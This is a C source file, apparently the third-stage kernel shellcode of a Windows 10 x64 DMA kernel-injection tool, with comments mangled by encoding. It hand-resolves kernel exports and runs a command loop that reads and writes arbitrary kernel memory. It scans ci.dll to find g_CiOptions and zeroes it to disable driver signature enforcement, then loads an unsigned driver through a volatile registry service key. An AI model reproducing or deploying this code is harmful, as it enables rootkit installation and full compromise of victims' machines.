// Win10X64Stage3.c : �����׶ε�ShellCode
#include "Win10X64Stage3.h"
#include "KernelModeInject.h"

#define KMJ_VOID			0xffff
#define KMJ_COMPLETED		0
#define KMJ_READ			1
#define KMJ_WRITE			2
#define KMJ_TERMINATE		3
#define KMJ_MEM_INFO		4
#define KMJ_EXEC		    5
#define KMJ_READ_VA			6
#define KMJ_WRITE_VA		7
#define KMJ_EXEC_EXTENDED	8
#define KMJ_LOAD_DRIVER  	9
#define KMJ_UNLOAD_DRIVER   10

// http://alter.org.ua/docs/nt_kernel/procaddr/
DWORD64 WX64STAGE3KernelGetModuleBase(_In_ PKMJDATA pk, _In_ LPSTR szModuleName)
{
	PBYTE pbSystemInfoBuffer;
	SIZE_T cbSystemInfoBuffer = 0;
	PSYSTEM_MODULE_INFORMATION_ENTRY pSME;
	DWORD64 i, qwAddrModuleBase = 0;
	pk->fn.FUN_ZwQuerySystemInformation(11, NULL, 0, (PULONG)&cbSystemInfoBuffer);
	if (!cbSystemInfoBuffer) { return 0; }
	pbSystemInfoBuffer = (PBYTE)pk->fn.FUN_ExAllocatePool(0, cbSystemInfoBuffer);
	if (!pbSystemInfoBuffer) { return 0; }
	if (0 == pk->fn.FUN_ZwQuerySystemInformation(11, pbSystemInfoBuffer, (ULONG)cbSystemInfoBuffer, (PULONG)&cbSystemInfoBuffer)) {
		pSME = ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Module;
		for (i = 0; i < ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Count; i++) {
			if (0 == pk->fn.FUN_stricmp(szModuleName, pSME[i].ImageName + pSME[i].PathLength)) {
				qwAddrModuleBase = (DWORD64)pSME[i].Base;
			}
		}
	}
	if (pbSystemInfoBuffer) { pk->fn.FUN_ExFreePool(pbSystemInfoBuffer); }
	return qwAddrModuleBase;
}

//https://www.caldow.cn/archives/4193
//https://www.163.com/dy/article/HIM2HP0S0511CJ6O.html
//��windows10 ��window7 ����λ�ò�һ����
//windows10 ��->c:\windows\System32\CI.dll!g_CiOptions
//windows7 ��->c:\windows\System32\ntoskrnl.exe!g_CiEnabled
//Windows �ϵ�����ǩ��У���ɵ����������ļ� ci.dll(= > %WINDIR%\System32\) ����
//�� Windows 8 ֮ǰ��CI ����һ��ȫ�ֲ������� g_CiEnabled������������ǩ�����ǽ���ǩ�����ⶼ�ǲ��������ġ�
//�� Windows 8 + �У�g_CiEnabled ����һ��ȫ�ֱ��� g_CiOptions �滻��
//���Ǳ�־����ϣ�����Ҫ���� 0x0 = ���á�0x6 = ���á�0x8 = ����ģʽ��
DWORD64 WX64STAGE3GetCiEnabledAddr(DWORD64 CIModuleAddr)
{
	DWORD64 qwA;
	DWORD i = 0, j = 0;
	qwA = WX64STAGE3GetProcAddress(CIModuleAddr, "CiInitialize");
	if (!qwA) {
		return 0;
	}
	do {
		// JMP��CiInitialize�Ӻ���
		if (*(PBYTE)(qwA + i) == 0xE9) {
			qwA = qwA + i + 5 + *(PLONG)(qwA + i + 1);
			do {
				// Scan for MOV to g_CiEnabled
				if (*(PUSHORT)(qwA + j) == 0x0D89) {
					return qwA + j + 6 + *(PLONG)(qwA + j + 2);
				}
				j++;
			} while (j < 256);
			return 0;
		}
		i++;
	} while (i < 128);
	return 0;
}

DWORD64 WX64STAGE3GetProcAddress(_In_ DWORD64 VmModuleBase, _In_ CHAR* ProcName)
{
	PDWORD RVAAddrNames = NULL;
	PDWORD RVAAddrFunctions = NULL;
	PWORD NameOrdinals = NULL;
	DWORD FnIdx = 0;
	LPSTR sz;
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)VmModuleBase;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(VmModuleBase + DosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY ExpDir = (PIMAGE_EXPORT_DIRECTORY)(NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + VmModuleBase);
	RVAAddrNames = (PDWORD)(VmModuleBase + ExpDir->AddressOfNames);
	NameOrdinals = (PWORD)(VmModuleBase + ExpDir->AddressOfNameOrdinals);
	RVAAddrFunctions = (PDWORD)(VmModuleBase + ExpDir->AddressOfFunctions);
	for (DWORD i = 0; i < ExpDir->NumberOfNames; i++) {

		sz = (LPSTR)(VmModuleBase + RVAAddrNames[i]);
		if (_stricmp(ProcName, sz) == 0)
		{
			FnIdx = NameOrdinals[i];
			if (FnIdx >= ExpDir->NumberOfFunctions) {
				return 0;
			}
			return VmModuleBase + RVAAddrFunctions[FnIdx];
		}
	}
	return 0;
}

BOOLEAN WX64STAGE3InitializeKernelFunctions(PKMJDATA pk)
{
	BOOLEAN bRet = FALSE;
	DWORD64  RetAddr = 0;
	do
	{
		RetAddr = *((PDWORD64)&pk->fn + FUN_ExFreePool) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ExFreePool");
		if (!RetAddr){
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmFreeContiguousMemory) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "MmFreeContiguousMemory");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmAllocateContiguousMemory) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "MmAllocateContiguousMemory");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmGetPhysicalAddress) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr,"MmGetPhysicalAddress");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmGetPhysicalMemoryRanges) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "MmGetPhysicalMemoryRanges");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmMapIoSpace) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "MmMapIoSpace");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_MmUnmapIoSpace) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "MmUnmapIoSpace");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_PsCreateSystemThread) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "PsCreateSystemThread");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlCopyMemory) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr,"RtlCopyMemory");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlZeroMemory) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "RtlZeroMemory");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlInitAnsiString) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "RtlInitAnsiString");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlInitUnicodeString) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "RtlInitUnicodeString");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_RtlAnsiStringToUnicodeString) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "RtlAnsiStringToUnicodeString");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwProtectVirtualMemory) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwProtectVirtualMemory");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_KeDelayExecutionThread) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "KeDelayExecutionThread");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwLoadDriver) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwLoadDriver");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwUnloadDriver) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwUnLoadDriver");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwQuerySystemInformation) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwQuerySystemInformation");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_stricmp) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "_stricmp");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ExAllocatePool) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ExAllocatePool");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwClose) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwClose");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwCreateFile) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwCreateFile");
		if (!RetAddr) {
			break;
		}
	    RetAddr = *((PDWORD64)&pk->fn + FUN_RtlFreeUnicodeString) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "RtlFreeUnicodeString");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_wcscat) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "wcscat");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwCreateKey) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwCreateKey");
		if (!RetAddr) {
			break;
		}
		RetAddr = *((PDWORD64)&pk->fn + FUN_ZwSetValueKey) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, "ZwSetValueKey");
		if (!RetAddr) {
			break;
		}

		bRet = TRUE;

	} while (FALSE);
	

	return bRet;
}

VOID WX64STAGE3MainLoop(PKMJDATA pk)
{
	PVOID pBufferOutDMA = NULL;
	DWORD64 IdleCount = 0;
	LONGLONG llTimeToWait = -10000;
	//����һ�οռ䣬������/д�����ݴ�ŵ�ַ��
	pk->DMASizeBuffer = 0x1000000;
	pBufferOutDMA = pk->fn.FUN_MmAllocateContiguousMemory(0x01000000, 0xffffffff);
	if (!pBufferOutDMA) {
		pk->DMASizeBuffer = 0x00400000;
		pBufferOutDMA = pk->fn.FUN_MmAllocateContiguousMemory(0x00400000, 0xffffffff);
	}
	if (!pBufferOutDMA) {
		pk->DMASizeBuffer = 0;
		pk->opStatus = 0xf0000001;
		return;
	}
	while (TRUE)
	{
		pk->opStatus = 1;
		if (KMJ_COMPLETED == pk->op) { 
			IdleCount++;
			if (IdleCount > 10000000000) {
				pk->fn.FUN_KeDelayExecutionThread(KernelMode, FALSE, &llTimeToWait);
			}
			continue;
		}
		pk->opStatus = 2;
		if (KMJ_TERMINATE == pk->op) { // EXIT
			pk->opStatus = 0xf0000000;
			pk->Result = TRUE;
			pk->MAGIC = 0;
			pk->op = KMJ_COMPLETED;
			return;
		}
		if (KMJ_READ_VA == pk->op) { // READ Virtual Address
			pk->fn.FUN_RtlCopyMemory(pBufferOutDMA, (PVOID)pk->RWAddress, pk->RWSize);
			pk->Result = TRUE;
		}
		if (KMJ_WRITE_VA == pk->op) { // WRITE Virtual Address
			pk->fn.FUN_RtlCopyMemory((PVOID)pk->RWAddress, pBufferOutDMA, pk->RWSize);
			pk->Result = TRUE;
		}
		if (KMJ_LOAD_DRIVER == pk->op)
		{

		}
		pk->opStatus = KMJ_COMPLETED;
		IdleCount = 0;
	}

}

VOID WX64STAGE3EntryPoint(PKMJDATA pk)
{
	pk->MAGIC = 0x0ff11337711333377;
	do
	{
		if (!WX64STAGE3InitializeKernelFunctions(pk)){
			break;
		}
		WX64STAGE3MainLoop(pk);

	} while (FALSE);
	
}

//�����ļ����Ƿ���Ч
NTSTATUS WX64STAGE3DriverRegGetImagePath(_In_ PKMJDATA pk, _Out_ PUNICODE_STRING ImagePath)
{
	NTSTATUS nt;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	// ����ļ��Ƿ����
	pk->fn.FUN_RtlInitAnsiString(&_sa, pk->DataInStr);
	pk->fn.FUN_RtlCopyMemory(pk->DataOutStr, pk->DataInStr, 260);
	pk->fn.FUN_RtlAnsiStringToUnicodeString(ImagePath, &_sa, TRUE);
	pk->fn.FUN_RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	pk->fn.FUN_RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&_oa, ImagePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = pk->fn.FUN_ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (hFile) {
		pk->fn.FUN_ZwClose(hFile);
	}
	if (NT_ERROR(nt)) {
		pk->fn.FUN_RtlFreeUnicodeString(ImagePath);
		return nt;
	}
	return ERROR_SUCCESS;
}

//��ȡ����(���һ��\֮�������)������һ����null��β���ַ�����
LPWSTR WX64STAGE3DriverRegGetImageNameFromPath(LPWSTR wszSrc)
{
	DWORD i = 0, j = 0;
	while (wszSrc[i] != 0) {
		if (wszSrc[i] == '\\') {
			j = i + 1;
		}
		i++;
	}
	return &wszSrc[j];
}

//http://www.pnpon.com/article/detail-387.html
//��ע����������������ֵType(1) ָ���ñ�������һ���ں�ģʽ��������
//1��Type(1) ָ���ñ�������һ���ں�ģʽ��������
//2��Start(3) ָ��ϵͳӦ��̬װ�������������
//(��ֵ��CreateService�е�SERVICE_DEMAND_START������Ӧ�������ں�ģʽ��������ʱ����������ȷ����StartService�����򷢳�NET START������������������)
//http://www.pnpon.com/article/detail-115.html
//3��ErrorControl(1) ָ�����װ�����������ʧ�ܣ�ϵͳӦ�ǼǸô�����ʾһ����Ϣ��
VOID WX64STAGE3DriverRegSetServiceKeys(_In_ PKMJDATA pk, _In_ HANDLE hKeyHandle, _In_ PUNICODE_STRING pusImagePath)
{
	WCHAR WSZ_ErrorControl[] = { 'E', 'r', 'r', 'o', 'r', 'C', 'o', 'n', 't', 'r', 'o', 'l', 0 };
	WCHAR WSZ_ImagePath[] = { 'I', 'm', 'a', 'g', 'e', 'P', 'a', 't', 'h', 0 };
	WCHAR WSZ_Start[] = { 'S', 't', 'a', 'r', 't', 0 };
	WCHAR WSZ_Type[] = { 'T', 'y', 'p', 'e', 0 };
	DWORD dwValue0 = 0, dwValue1 = 1, dwValue3 = 3;
	UNICODE_STRING usErrorControl, usImagePath, usStart, usType;
	pk->fn.FUN_RtlInitUnicodeString(&usErrorControl, WSZ_ErrorControl);
	pk->fn.FUN_RtlInitUnicodeString(&usImagePath, WSZ_ImagePath);
	pk->fn.FUN_RtlInitUnicodeString(&usStart, WSZ_Start);
	pk->fn.FUN_RtlInitUnicodeString(&usType, WSZ_Type);
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usStart, 0, REG_DWORD, (PVOID)&dwValue3, sizeof(DWORD)); // 3 = Load on Demand
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usType, 0, REG_DWORD, (PVOID)&dwValue1, sizeof(DWORD)); // 1 = Kernel Device Driver
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usErrorControl, 0, REG_DWORD, (PVOID)&dwValue0, sizeof(DWORD)); // 0 = Do not show warning
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usImagePath, 0, REG_SZ, pusImagePath->Buffer, pusImagePath->Length + 2);
}


//���Դ���һ��ע������ZwLoadDriver����ʹ������������������
NTSTATUS WX64STAGE3DriverRegCreateService(_In_ PKMJDATA pk, _Out_ WCHAR ServicePath[MAX_PATH])
{
	NTSTATUS nt;
	WCHAR WSZ_ServicePathBase[] = { '\\', 'R', 'e', 'g', 'i', 's', 't', 'r', 'y', '\\',  'M', 'a', 'c', 'h', 'i', 'n', 'e', '\\', 'S', 'y', 's', 't', 'e', 'm', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'S', 'e', 't', '\\', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '\\', 0 };
	UNICODE_STRING usRegPath, usImagePath;
	OBJECT_ATTRIBUTES _oaReg;
	LPWSTR wszImageName;
	HANDLE hKeyHandle;
	nt = WX64STAGE3DriverRegGetImagePath(pk, &usImagePath);
	if (NT_ERROR(nt)) {
		return nt;
	}
	wszImageName = WX64STAGE3DriverRegGetImageNameFromPath(usImagePath.Buffer);
	pk->fn.FUN_RtlCopyMemory(ServicePath, WSZ_ServicePathBase, sizeof(WSZ_ServicePathBase) + 2);
	pk->fn.FUN_wcscat(ServicePath, wszImageName);
	pk->fn.FUN_RtlInitUnicodeString(&usRegPath, ServicePath);
	// create the reg key
	InitializeObjectAttributes(&_oaReg, &usRegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = pk->fn.FUN_ZwCreateKey(&hKeyHandle, KEY_ALL_ACCESS, &_oaReg, 0, NULL, REG_OPTION_VOLATILE, NULL);
	if (NT_SUCCESS(nt)) {
		WX64STAGE3DriverRegSetServiceKeys(pk, hKeyHandle, &usImagePath);
	}
	pk->fn.FUN_RtlFreeUnicodeString(&usImagePath);
	pk->fn.FUN_ZwClose(hKeyHandle);
	return nt;
}

NTSTATUS WX64STAGE3DriverLoadByImagePath(_In_ PKMJDATA pk)
{
	NTSTATUS nt;
	WCHAR wszServicePath[MAX_PATH];
	UNICODE_STRING usServicePath;
	DWORD i;
	nt = WX64STAGE3DriverRegCreateService(pk, wszServicePath);
	if (NT_ERROR(nt)) {
		return nt;
	}
	for (i = 0; i < MAX_PATH; i++) {
		pk->DataOutStr[i] = (CHAR)wszServicePath[i];
	}
	pk->fn.FUN_RtlInitUnicodeString(&usServicePath, wszServicePath);
	return pk->fn.FUN_ZwLoadDriver(&usServicePath);
}

BOOLEAN WX64STAGE3LoadDriver(_In_ PKMJDATA pk)
{
	BOOLEAN bRet = FALSE;
	DWORD64 CIModuleAddr = 0;
	PDWORD64 CIModuleCiOpAddr = NULL;
	DWORD64 CIModuleCiOpOrig = 0;
	do
	{
		if (NULL == pk) {
			break;
		}
		// û��Ҫ������ļ�������ֱ�ӷ���
		if (0 == pk->DataInStr[0]){
			break;
		}
		//�õ�CI��ַ
		CIModuleAddr = WX64STAGE3KernelGetModuleBase(pk, "ci.dll");
		if (!CIModuleAddr){
			break;
		}
		CIModuleCiOpAddr = (PDWORD64)WX64STAGE3GetCiEnabledAddr(CIModuleAddr);
		if (!CIModuleCiOpAddr) {
			break;
		}
		//����ԭʼֵ�����޸�
		CIModuleCiOpOrig = *CIModuleCiOpAddr;
		*CIModuleCiOpAddr = 0;  //0x0 = ���á�0x6 = ���á�0x8 = ����ģʽ
		//��������
		pk->DataOut[0] = WX64STAGE3DriverLoadByImagePath(pk);
		//��ԭ
		*CIModuleCiOpAddr = CIModuleCiOpOrig;
		bRet = TRUE;

	} while (FALSE);
	

	return bRet;
}